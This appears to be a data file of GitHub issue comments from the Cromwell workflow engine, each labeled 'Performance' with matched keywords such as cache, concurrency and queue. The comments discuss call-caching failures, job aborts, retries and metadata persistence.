priority.**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324116356:2218,concurren,concurrent-job-limit,2218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324116356,1,['concurren'],['concurrent-job-limit']
Performance,"I'll largely defer to @cjllanwarne, @mcovarr, or @danbills on the specifics, but it seems that you could specify the runtime attribute you need and how to interpret it by customizing the SLURM backend in the config:. https://cromwell.readthedocs.io/en/stable/backends/SLURM/. If I'm reading the docs correctly, it might be possible to inject your `module load` command into the `--wrap` argument.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-505658382:355,load,load,355,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-505658382,1,['load'],['load']
Performance,"I'm guessing that the ""people aren't around"" thing isn't going to change at 5pm on a Friday, so .... I'm thinking now that instead, perhaps the thing to do is to also have the actor know if read is on and if write is on. When the actor spins up, it ...; - If read is on, just starts determining the cache hit status w/o being asked; - If write is on, starts hashing everything; - If both are on, starts hashing everything but is checking for cache hit until a miss occurs, at which point it's just generating hashes. The actor could then receive two messages, one is ""are you a cache hit"" and the other is ""please now persist to the store"" (if you asked for cache hit status before it was done, perhaps it could send back a ""come back later"" message - that way you can avoid returning the Futures, although perhaps people like that). We know for a fact that if read is on that we'll be checking the cache, so might as well start that ASAP. If write is on, we're potentially wasting energy - e.g. if a job fails, but presumably (hopefully!) job successes are more common than job failures and we can get a jumpstart on the process.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1225#issuecomment-236289880:299,cache,cache,299,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1225#issuecomment-236289880,5,['cache'],['cache']
Performance,I'm having problems even trying to submit that many workflows concurrently. Cromwell starts taking a long time to respond to submissions from the Swagger page.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1007#issuecomment-227246197:62,concurren,concurrently,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1007#issuecomment-227246197,1,['concurren'],['concurrently']
Performance,"I'm having trouble getting call caching to work with Singularity and SGE, and I'm wondering if anyone has a working example config or some pointers. My config is below, minus passwords and specific paths/urls, which I've replaced with a label encased in <>. I've tried switching to slower hashing strategies finagling with the command construction to no avail. If there's not an obvious solution, is there an easy way to debug this? There are no network issues preventing connections to dockerhub - pulling images and converting to .sif works fine. It's only call caching that's broken. Even when I see, in the metadata, identical hashes for the docker image and all inputs and outputs, I see a ""Cache Miss"" as the result, every time. . The call caching stanza in my metadata looks like this, for example. Am I missing something? ; ```; ""callCaching"": {; ""allowResultReuse"": true,; ""hashes"": {; ""output count"": ""C4CA4238A0B923820DCC509A6F75849B"",; ""runtime attribute"": {; ""docker"": ""4B2AB7B9EA875BF5290210F27BB9654D"",; ""continueOnReturnCode"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""failOnStderr"": ""68934A3E9455FA72420237EB05902327""; },; ""output expression"": {; ""File output_greeting"": ""DFC652723D8EBD4BB25CAC21431BB6C0""; },; ""input count"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""backend name"": ""2A2AB400D355AC301859E4ABB5432138"",; ""command template"": ""AFAC58B849BD67585A857F538B8E92F6""; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache"",; ""hit"": false,; ""result"": ""Cache Miss""; },; ```. ```; # simple sge apptainer conf (modified from the slurm one); #; workflow-options; {; workflow-log-dir: ""cromwell-workflow-logs""; workflow-log-temporary: false; workflow-failure-mode: ""ContinueWhilePossible""; default; {; workflow-type: WDL; workflow-type-version: ""draft-2""; }; }. database {; # Store metadata in a file on disk that can grow much larger than RAM limits.; metadata {; profile = ""slick.jdbc.MySQLProfile$""; db {; url = ""jdbc:mysql:<dburl>?rewriteBatchedStatements=true""; driver = ""com.mysql.cj.jdb",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480:696,Cache,Cache,696,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480,1,['Cache'],['Cache']
Performance,"I'm not sure the exact scenario people would want to use this in, but it seems to replace the previous behavior ""retry a few times for known flakinesses, otherwise fail"" - with a less tuned ""retry a custom number of times for all codes"". * Is there any possibility that users would want to continue retrying on known flakinesses (hint: I really think they do) but not blindly restart on other error codes (which could be expensive for typos!)?; ---; One other thought:; * This seems to only catch JES telling us the task has failed. If the task on JES ""succeeds"" but Cromwell later finds out that it cannot download or evaluate a result, does this still retry?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3490#issuecomment-379274281:184,tune,tuned,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3490#issuecomment-379274281,1,['tune'],['tuned']
Performance,"I'm running a pipeline and for some of the tasks, sometime I get the following error:. `[E::hts_open_format] Failed to open file ...`. What I find weird is that if I re-run it, it runs successfully. It looks a ""stochastic"" error. Below you can find the full logs for that task and, as you can see, the file was successfully localized. ```; timestamp,message; 1608596940672,*** LOCALIZING INPUTS ***; 1608596942260,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-47/cacheCopy/SR00c.HG02019.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-47/cacheCopy/SR00c.HG02019.txt.gz.tbi; 1608596944807,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-81/cacheCopy/SR00c.HG03449.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-81/cacheCopy/SR00c.HG03449.txt.gz; 1608596946491,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-94/cacheCopy/SR00c.HG03789.txt.gz.tbi to focal-gwf-core/cromwell-ex",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:691,cache,cacheCopy,691,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,2,['cache'],['cacheCopy']
Performance,"I'm running cromwell 46 with AWS, and having problems with call caching ... 2019-09-30 15:37:20,124 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - Failed to hash ""s3://bdtx-scratch/Andrei/bdtx_dataset_1.00_anno_column_description.txt"": [Attempted 1 time(s)] - S3Exception: null (Service: S3, Status Code: 301, Request ID: null); 2019-09-30 15:37:20,125 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - 66419bab:count_lines.countLines:-1:1: Hash error ([Attempted 1 time(s)] - S3Exception: null (Service: S3, Status Code: 301, Request ID: null)), disabling call caching for this job. call caching settings:; call-caching {; enabled = true; invalidate-bad-cache-results = false; }. Thanks. ###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5204:682,cache,cache-results,682,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5204,1,['cache'],['cache-results']
Performance,"I'm totally fine with using an actor rather than a floating Future here, that should allow for better concurrency management. But the structure of the code prior to this PR was the lowest-cost refactoring of the Olde Worlde JES backend to the New World, while this PR addressed the issue raised in #1004 that there was effectively a duplication of `Retry.withRetry`. If somebody wants to ticket replacing all the usages of `Retry.withRetry` with an Actor-based approach and lobby for that to be prioritized that's great, but making changes that broad seemed like more work than had been called for in this ticket. Or you could just submit a PR as @geoffjentry suggests. 😄",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226590779:102,concurren,concurrency,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226590779,1,['concurren'],['concurrency']
Performance,"I'm trying to run the same wdl on gsa5 now with the snapshot (cromwell-25-1d61047-SNAP.jar). I tried it with call caching and it is slow to retrieve the cache hits. One every 5 seconds or so. Here's the relevant jstack:. ```; ""cromwell-system-akka.dispatchers.engine-dispatcher-34"" #99 prio=5 os_prio=0 tid=0x00002b4fa8024800 nid=0x174b2 runnable [0x00002b4da8502000]; java.lang.Thread.State: RUNNABLE; 	at scala.collection.Iterator$class.exists(Iterator.scala:919); 	at scala.collection.AbstractIterator.exists(Iterator.scala:1336); 	at scala.collection.IterableLike$class.exists(IterableLike.scala:77); 	at scala.collection.AbstractIterable.exists(Iterable.scala:54); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActorData$$anonfun$cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActorData$$upstreamFailed$1$1.apply(WorkflowExecutionActorData.scala:88); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActorData$$anonfun$cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActorData$$upstreamFailed$1$1.apply(WorkflowExecutionActorData.scala:87); 	at scala.collection.TraversableLike$$anonfun$filterImpl$1.apply(TraversableLike.scala:248); 	at scala.collection.immutable.List.foreach(List.scala:381); 	at scala.collection.TraversableLike$class.filterImpl(TraversableLike.scala:247); 	at scala.collection.TraversableLike$class.filter(TraversableLike.scala:259); 	at scala.collection.AbstractTraversable.filter(Traversable.scala:104); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActorData.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActorData$$upstreamFailed$1(WorkflowExecutionActorData.scala:87); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActorData$$anonfun$3.apply(WorkflowExecutionActorData.scala:93); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActorData$$anonfun$3.apply(WorkflowExecutionActorData.scala:92); 	at scala.collection.TraversableLike$",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-278438957:153,cache,cache,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-278438957,1,['cache'],['cache']
Performance,"I've been working on testing the AWS Batch Cromwell support, following documentation from @wleepang (https://docs.opendata.aws/genomics-workflows) in the CWL hackathon with @cjllanwarne and @aednichols. The workflow is a small test with everything in an S3 bucket:; ; https://github.com/bcbio/test_bcbio_cwl/tree/master/aws. I'm happy to report that I made good progress and have bcbio-vm using CloudFormation templates to setup the Cromwell batch ready AMI and AWS Batch requirements. I can then generate the right Cromwell AWS configuration and launch jobs to AWS batch. I see them get submitted, EC2 resources get spun up and jobs get queued and run. Awesome. When they're all ready and prepped to run, the instances fail with not finding the `cwl.inputs.json` file staged into the working directory:; ```; [2019-01-25 13:53:43,03] [info] AwsBatchAsyncBackendJobExecutionActor [2c2e5a10prep_samples_to_rec:NA:1]: Status change from Initializing to Running; [2019-01-25 13:53:59,61] [info] AwsBatchAsyncBackendJobExecutionActor [2c2e5a10alignment_to_rec:NA:1]: Status change from Initializing to Running; [2019-01-25 13:58:25,58] [info] AwsBatchAsyncBackendJobExecutionActor [2c2e5a10alignment_to_rec:NA:1]: Status change from Running to Failed; [2019-01-25 13:58:39,11] [info] AwsBatchAsyncBackendJobExecutionActor [2c2e5a10prep_samples_to_rec:NA:1]: Status change from Running to Failed; [2019-01-25 13:58:40,06] [error] WorkflowManagerActor Workflow 2c2e5a10-8c57-4f9f-8d80-c2fccacbb452 failed (during ExecutingWorkflowState): Job alignment_to_rec:NA:1 exited with return code 1 which has not been declared as a valid return code. See 'continueOnReturnCode' runtime attribute for more details.; Check the content of stderr for potential additional information: s3://bcbio-batch-cromwell-test/cromwell-execution/main-somatic.cwl/2c2e5a10-8c57-4f9f-8d80-c2fccacbb452/call-alignment_to_rec/alignment_to_rec-stderr.log.; Traceback (most recent call last):; File ""/usr/local/bin/bcbio_nextgen.py"", lin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4586:638,queue,queued,638,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4586,1,['queue'],['queued']
Performance,"I've downloaded the new jar file, still showing version 30.2, but still seeing the problem in some situations:. 2018-02-21 11:03:39,563 cromwell-system-akka.dispatchers.engine-dispatcher-95 INFO - Abort requested for workflow f0bff6e2-77a6-46f5-b226-13a64339a286.; 2018-02-21 11:03:39,564 cromwell-system-akka.dispatchers.engine-dispatcher-95 INFO - WorkflowExecutionActor-f0bff6e2-77a6-46f5-b226-13a64339a286 [UUID(f0bff6e2)]: Aborting workflow; 2018-02-21 11:03:39,567 cromwell-system-akka.dispatchers.engine-dispatcher-50 WARN - unhandled event EngineLifecycleActorAbortCommand in state SubWorkflowRunningState. Several SGE queue jobs continue to run/stay in the queue waiting state. Terminating the server with a ctrl-C does not affect the queued jobs.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3325:627,queue,queue,627,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3325,3,['queue'],"['queue', 'queued']"
Performance,"I've downloaded the new jar file, still showing version 30.2, but still seeing the problem in some situations:. 2018-02-21 11:03:39,563 cromwell-system-akka.dispatchers.engine-dispatcher-95 INFO - Abort requested for workflow f0bff6e2-77a6-46f5-b226-13a64339a286.; 2018-02-21 11:03:39,564 cromwell-system-akka.dispatchers.engine-dispatcher-95 INFO - WorkflowExecutionActor-f0bff6e2-77a6-46f5-b226-13a64339a286 [UUID(f0bff6e2)]: Aborting workflow; 2018-02-21 11:03:39,567 cromwell-system-akka.dispatchers.engine-dispatcher-50 WARN - unhandled event EngineLifecycleActorAbortCommand in state SubWorkflowRunningState. Several SGE queue jobs continue to run/stay in the queue waiting state. Terminating the server with a ctrl-C does not affect the queued jobs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3259#issuecomment-367435337:627,queue,queue,627,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3259#issuecomment-367435337,3,['queue'],"['queue', 'queued']"
Performance,"I've found at least three kinds of brokenness here:; 1. Cromwell never sends a `WorkflowManagerAbortSuccess` from the `WorkflowManagerActor` to the API handler, so the response to the abort POST is never completed on a successful abort.; 2. If the `WorkflowManagerActor` is asked to abort a workflow ID it doesn't recognize it throws a `WorkflowNotFoundException` which eventually completes the abort request with a 404. Unfortunately the decoupling between the `WorkflowStore` and the `WorkflowManagerActor` introduces a gaping race condition where a legitimate workflow ID may not be known to the `WorkflowManagerActor` for a long time after that ID has been returned to the submitter.; 3. There's a third failure mode where the abort request seems to be ignored with various error and warning messages and jobs just keep running:. ```; 2016-09-09 15:50:44,628 cromwell-system-akka.actor.default-dispatcher-7 INFO - Workflow aed1aad8-588d-4f84-aa09-da0f663d68c0 submitted.; 2016-09-09 15:50:56,111 cromwell-system-akka.actor.default-dispatcher-15 INFO - 1 new workflows fetched; 2016-09-09 15:50:56,112 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - WorkflowManagerActor Starting workflow UUID(aed1aad8-588d-4f84-aa09-da0f663d68c0); 2016-09-09 15:50:56,116 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - WorkflowManagerActor Successfully started WorkflowActor-aed1aad8-588d-4f84-aa09-da0f663d68c0; 2016-09-09 15:50:56,116 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2016-09-09 15:50:56,175 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: transitioning from WorkflowUnstartedState to MaterializingWorkflowDescriptorState; 2016-09-09 15:50:56,261 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - MaterializeWorkflowDescriptorActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: Call-to-Backend assignmen",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733:529,race condition,race condition,529,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733,1,['race condition'],['race condition']
Performance,"I've never used Cromwell this way but my understanding is that good call caching performance is heavily dependent on cloud object storage. This is because it returns checksums in a short, constant time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159:81,perform,performance,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159,1,['perform'],['performance']
Performance,"IIRC the main driver for this was to be able to turn off cache copying. Google bills a bucket owner for egress and not the account copying out of the bucket, so a bucket owner is potentially at the mercy of Cromwell's cache hit routing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1324#issuecomment-324207364:57,cache,cache,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1324#issuecomment-324207364,2,['cache'],['cache']
Performance,"IOAction.scala:161) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1$$anonfun$run$1.apply(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at scala.collection.Iterator$class.foreach(Iterator.scala:742) ~[cromwell.jar:0.19]; at scala.collection.AbstractIterator.foreach(Iterator.scala:1194) ~[cromwell.jar:0.19]; at scala.collection.IterableLike$class.foreach(IterableLike.scala:72) ~[cromwell.jar:0.19]; at scala.collection.AbstractIterable.foreach(Iterable.scala:54) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1.run(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1.run(DBIOAction.scala:158) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_72]; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_72]; at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_72]; 2016-04-26 18:26:09,846 cromwell-system-akka.actor.default-dispatcher-11 ERROR - WorkflowActor [UUID(ea0272fc)]: Call failed to initialize: Could not persist runtime attributes: Duplicate entry '163980-preemptible' for key 'UK_RUNTIME_ATTRIBUTE'; 2016-04-26 18:26:09,885 cromwell-system-akka.actor.default-dispatcher-11 INFO - WorkflowActor [UUID(ea0272fc)]: persisting status of ComputeStatistics to Failed.; 2016-04-26 18:26:09,888 cromwell-system-akka.actor.default-dispatcher-11 ERROR - WorkflowActor [UUID(ea0272fc)]: Call failed to initialize: Could not persist runtime attributes: Duplicate entry '163979-preemptible' for key 'UK_RUNTIME_ATTRIBUTE'; 2016-04-26 18:26:09,889 cromwell-system-akka.actor.default-dispatcher-11 INFO - WorkflowActor [UUID(ea0272fc)]: persisting status of ComputeMetadata to Failed.; 2016-04-26 18:26:10,263 cromwell-system-akka.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251:10798,concurren,concurrent,10798,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251,1,['concurren'],['concurrent']
Performance,"IOAction.scala:161) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1$$anonfun$run$1.apply(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at scala.collection.Iterator$class.foreach(Iterator.scala:742) ~[cromwell.jar:0.19]; at scala.collection.AbstractIterator.foreach(Iterator.scala:1194) ~[cromwell.jar:0.19]; at scala.collection.IterableLike$class.foreach(IterableLike.scala:72) ~[cromwell.jar:0.19]; at scala.collection.AbstractIterable.foreach(Iterable.scala:54) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1.run(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1.run(DBIOAction.scala:158) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_72]; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_72]; at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_72]; 2016-04-26 18:26:09,846 cromwell-system-akka.actor.default-dispatcher-11 ERROR - WorkflowActor [UUID(ea0272fc)]: Could not persist runtime attributes; com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException: Duplicate entry '163980-preemptible' for key 'UK_RUNTIME_ATTRIBUTE'; at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[na:1.8.0_72]; at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) ~[na:1.8.0_72]; at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[na:1.8.0_72]; at java.lang.reflect.Constructor.newInstance(Constructor.java:423) ~[na:1.8.0_72]; at com.mysql.jdbc.Util.handleNewInstance(Util.java:400) ~[cromwell.jar:0.19]; at com.mysql.jdbc.Util.getInstance(Util.java:383) ~[cromwell.jar:0.19]; at com.mysql.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251:6552,concurren,concurrent,6552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251,1,['concurren'],['concurrent']
Performance,IP Exhaustion causes PAPI to throttle its own API calls,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3665:29,throttle,throttle,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3665,1,['throttle'],['throttle']
Performance,"IT should be able to get the hash. Anyway, in this case, it's not a big; deal, since this is part of our github testing. On Fri, Aug 11, 2017 at 11:22 AM, Thib <notifications@github.com> wrote:. > It can run the task without having its hash, it just won't try to call; > cache it nor write it to the cache; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321842808>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk4g7uP1uJPFhouOoyfne9aGXQrA8ks5sXHHBgaJpZM4O0GvF>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321869435:271,cache,cache,271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321869435,2,['cache'],['cache']
Performance,"Idea: remove a potential window of doom around Cromwell restart by ensuring no workflow metadata is still waiting in the metadata write queue *before* deleting the Workflow Store entry. Problem:. * A workflow finishes; * It submits a bunch of ""finishing out"" metadata to the MetadataWriteActor; * It removes its entry from the workflow store; * == Cromwell Restarts ==; * The finishing out metadata (eg ""Status => Complete"") is never persisted. To help decide how important this is: ; * How long is our current metadata write queue (in total metadata entries, and in time in queue); * How big a deal is it if we occasionally lose Status Complete metadata entries?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4832:136,queue,queue,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4832,3,['queue'],['queue']
Performance,"If `abort-all-workflows-on-terminate` is true, Cromwell will send a message directly to the WorkflowManagerActor which will trigger jobs to be aborted on the backend side but the workflow store is not made aware of that. Which means on restart, all ""aborted"" workflows will be restarted. Possible fix: instead of going to the WMA directly, send the abort command to the WorkflowStore first like it's done for single workflow abort, and have the WorkflowStore notify the WMA when all workflows have been removed. There might be a race condition between workflow submission and workflow deletion from the store so it might need some carefully ordered messages.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2492:529,race condition,race condition,529,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2492,1,['race condition'],['race condition']
Performance,"If a call hits the cache but fails to use the cached call for whatever reason (output / detritus file not found etc...) , the cached call isn't invalidated so every other similar call will always fail to use the cache.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1510:19,cache,cache,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1510,4,['cache'],"['cache', 'cached']"
Performance,"If a java.util.concurrent.ExecutionException, check if it has an inner cause that is actually fatal.; Pre-update to SBT 1.x.; The cromwell multi-project with SBT 1.x consumes a lot of memory. To avoid OOME:; - Bump IntelliJ from 768 to something like 1786.; - Bump .sbtopts to something like 3072. Build updates while prepping fo sbt version bump, including using sbt-doge temporarily for simplified SBT 0.13 cross version build syntax.; DRYed out a bit of the module dependency graph.; Publish hotfix libraries, not just executables.; Replaced deprecated commons-lang with commons-text replacements.; Fixed test class errantly nested within its companion object.; Fixed test that was only liquibasing metadata, and not the original database.; Removed unused TestActorSystem.; Fixed missing test in ""common"".; Removed old ""common"" sbt files.; Cleaner version of assembly.; SwaggerUI injected into the cromwell-version.conf, so it only needs to be editted in one place.; Replaced usage of 'sbt ""project foo"" sometask' with 'sbt foo/sometask'.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2821:15,concurren,concurrent,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2821,1,['concurren'],['concurrent']
Performance,"If call cache writing is disabled and a cache miss is known, we could update the various File Hasher actors and tell them not to bother computing no-longer-required file hashes. - [X] Depends on #1307",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1316:8,cache,cache,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1316,2,['cache'],['cache']
Performance,"If this is alignment to the human genome reference, each aligning job will require ~8GB of RAM. If you have 10 jobs running concurrently you would want to make sure there are ~80Gb of RAM available. Alternatively, with CallCaching active, you can just re-run the workflow until all tasks have succeeded.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6188#issuecomment-796893864:124,concurren,concurrently,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6188#issuecomment-796893864,1,['concurren'],['concurrently']
Performance,If this is ever implemented it should be `DEBUG` or a configurable option w/ a warning about the potential performance impact,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1368#issuecomment-269263625:107,perform,performance,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1368#issuecomment-269263625,1,['perform'],['performance']
